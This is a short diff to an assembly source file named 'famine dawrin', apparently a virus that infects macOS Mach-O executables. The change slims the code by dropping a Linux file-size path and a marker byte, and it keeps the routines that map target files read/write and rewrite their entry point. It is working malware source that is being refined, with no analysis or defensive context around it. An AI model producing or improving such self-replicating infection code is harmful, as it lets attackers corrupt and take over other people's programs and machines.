@@ -1,4 +1,4 @@
-; famine dawrin - size 694 bytes
+; famine dawrin - size 675 bytes
 
 %include "famine.inc"
 
@@ -130,20 +130,16 @@ process:                                                        ; expecting file
                 cmp         rax, 0
                 jnz         .close
 
-                mov         rax, qword [rsp - (0x148-0x30)]     ; linux st_size
-                test        r15b, r15b
-                jz          .st_size
-                mov         rax, qword [rsp - (0x148-0x48)]     ; macos st_size
-.st_size:
-                mov         [rsp-0x50], rax                     ; rsp-0x50 = infect_fsize
-                cmp         rax, 0x1000                         ; file too small
+                mov         rsi, qword [rsp - (0x148-0x48)]     ; macos st_size
+                mov         [rsp-0x50], rsi                     ; rsp-0x50 = infect_fsize
+                cmp         rsi, 0x1000                         ; file too small
                 jl          .close
 
                 xor         r9, r9
                 mov         r8, [rsp-0x48]
                 mov         r10, MAP_SHARED
                 mov         rdx, PROT_READ | PROT_WRITE
-                mov         rsi, rax
+                                                                ; rsi has file size already
                 xor         rdi, rdi
                 mov         rax, Darwin__NR_mmap
                 syscall
@@ -237,7 +233,6 @@ insert_macho64:                                                 ; expecting data
 
                 mov         qword [rdi - 8], rcx                ; store entry point
                 mov         qword [rdi - 16], rax               ; store pos
-                mov         byte [rdi - 17], 1                  ; mark mach-o
                 jmp         .return
 
 .next_lcmd:     mov         eax, dword [rdi + 4]                ; cmdsize
